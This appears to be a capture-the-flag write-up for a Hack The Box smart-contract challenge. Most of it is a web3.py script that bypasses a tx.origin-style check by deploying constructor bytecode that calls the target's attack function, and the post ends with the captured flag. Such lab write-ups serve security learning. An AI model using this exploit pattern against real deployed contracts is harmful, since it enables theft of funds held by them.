
![](https://cdn-images-1.medium.com/max/1000/1*OcVvvGcmp4_HjTYOKiLmGw.png)

#### Challenge Scenario

---

After defeating her first monster, Alex stood frozen, staring up at another massive, hulking creature that loomed over her. She knew that this was a fight she couldn’t win on her own. She turned to her guildmates, trying to come up with a plan. “We need to distract it,” Alex said. “If we can get it off balance, we might be able to take it down.” Her guildmates nodded, their eyes narrowed in determination. They quickly came up with a plan to lure the monster away from their position, using a combination of noise and movement to distract it. As they put their plan into action, Alex drew her sword and waited for her chance.

![](https://cdn-images-1.medium.com/max/1000/1*SCXggIkooGLT_9MzQ5urLg.png)

We can see a pixel-style mini-game on the homepage

![](https://cdn-images-1.medium.com/max/1000/1*jH4yNX9inDK9xQiEeyyGoQ.png)

we tried attack ,but dodged

we can found a connection page and a docs page

![](https://cdn-images-1.medium.com/max/1000/1*PyWW-iuuV97xrbo-YV399w.png)

![](https://cdn-images-1.medium.com/max/1000/1*JlYUBbD5kJBfDaq7voiPow.png)

key here

check the zip file

here is two .sol

![](https://cdn-images-1.medium.com/max/1000/1*eCVdYXszUE9MeFY73ruiag.png)

![](https://cdn-images-1.medium.com/max/1000/1*nAVORfcRYrlcsdiUFlQl0g.png)

![](https://cdn-images-1.medium.com/max/1000/1*cwFtGu4GxHd5BWX8LWjbgw.png)

![](https://cdn-images-1.medium.com/max/1000/1*OAxqsK4MsxTmR28-uAwt-w.png)

and we can found how to make damage

To successfully deduct health points (deal damage), the following must be met:

✅ Must be called via a smart contract  
✅ msg.sender != aggro  
✅ Attacks from multiple different addresses

so，use the py below

> **_from web3 import Web3_**

> **_RPC_URL = “http://your target/rpc"  
> PRIVATE_KEY = “what you get from connection”  
> TARGET = Web3.to_checksum_address(“what you get from connection”)_**

> **_w3 = Web3(Web3.HTTPProvider(RPC_URL))  
> acct = w3.eth.account.from_key(PRIVATE_KEY)_**

> **_abi = [  
>  {“inputs”:[{“name”:”_damage”,”type”:”uint256"}],”name”:”attack”,”outputs”:[],”stateMutability”:”nonpayable”,”type”:”function”},  
>  {“inputs”:[],”name”:”loot”,”outputs”:[],”stateMutability”:”nonpayable”,”type”:”function”},  
>  {“inputs”:[],”name”:”lifePoints”,”outputs”:[{“type”:”uint256",”name”:””}],”stateMutability”:”view”,”type”:”function”},  
> ]_**

> **_target = w3.eth.contract(address=TARGET, abi=abi)_**

> **_def send_tx(tx):  
>  signed = acct.sign_transaction(tx)  
>  tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)  
>  receipt = w3.eth.wait_for_transaction_receipt(tx_hash)  
>  print(“[+] tx:”, tx_hash.hex(), “status:”, receipt.status)  
>  if receipt.status != 1:  
>  raise Exception(“transaction reverted”)  
>  return receipt_**

> **_nonce = w3.eth.get_transaction_count(acct.address)  
> gas_price = w3.eth.gas_price  
> chain_id = w3.eth.chain_id_**

> **_print(“[*] account:”, acct.address)  
> print(“[*] chain_id:”, chain_id)_** 
> print(“[*] Setting aggro…”)  
> tx = target.functions.attack(0).build_transaction({  
>  “from”: acct.address,  
>  “nonce”: nonce,  
>  “gas”: 200000,  
>  “gasPrice”: gas_price,  
>  “chainId”: chain_id,  
> })  
> send_tx(tx)  
> nonce += 1_**

> **_hp = target.functions.lifePoints().call()  
> print(“[*] HP before:”, hp)_**
> selector = w3.keccak(text=”attack(uint256)”)[:4]  
> calldata = selector + hp.to_bytes(32, “big”)_**

> **_target_hex = TARGET[2:]_**

> **_# init code:  
> # codecopy calldata -> mem[0]  
> # CALL target.attack(hp)  
> # return empty runtime  
> init_code = (  
>  “6024602e600039”  
>  “6000600060246000600073” + target_hex +  
>  “5af15060006000f3”  
> ) + calldata.hex()_**

> **_print(“[*] Attacking via constructor contract…”)  
> tx = {  
>  “from”: acct.address,  
>  “nonce”: nonce,  
>  “gas”: 300000,  
>  “gasPrice”: gas_price,  
>  “chainId”: chain_id,  
>  “data”: “0x” + init_code,  
> }  
> send_tx(tx)  
> nonce += 1_**
> **_hp = target.functions.lifePoints().call()  
> print(“[*] HP after:”, hp)_**
> print(“[*] Looting…”)  
> tx = target.functions.loot().build_transaction({  
>  “from”: acct.address,  
>  “nonce”: nonce,  
>  “gas”: 200000,  
>  “gasPrice”: gas_price,  
>  “chainId”: chain_id,  
> })  
> send_tx(tx)_**

> **_print(“[+] DONE”)_**

![](https://cdn-images-1.medium.com/max/1000/1*NfYEBYJquJPTVka_w4fniQ.png)

![](https://cdn-images-1.medium.com/max/1000/1*npMEYa3qNHoBKXZMdaYTWA.png)

get the flag

**_HTB{tx.0r1gin_c4n_74k3_d0wn_4_m0n5732}_**
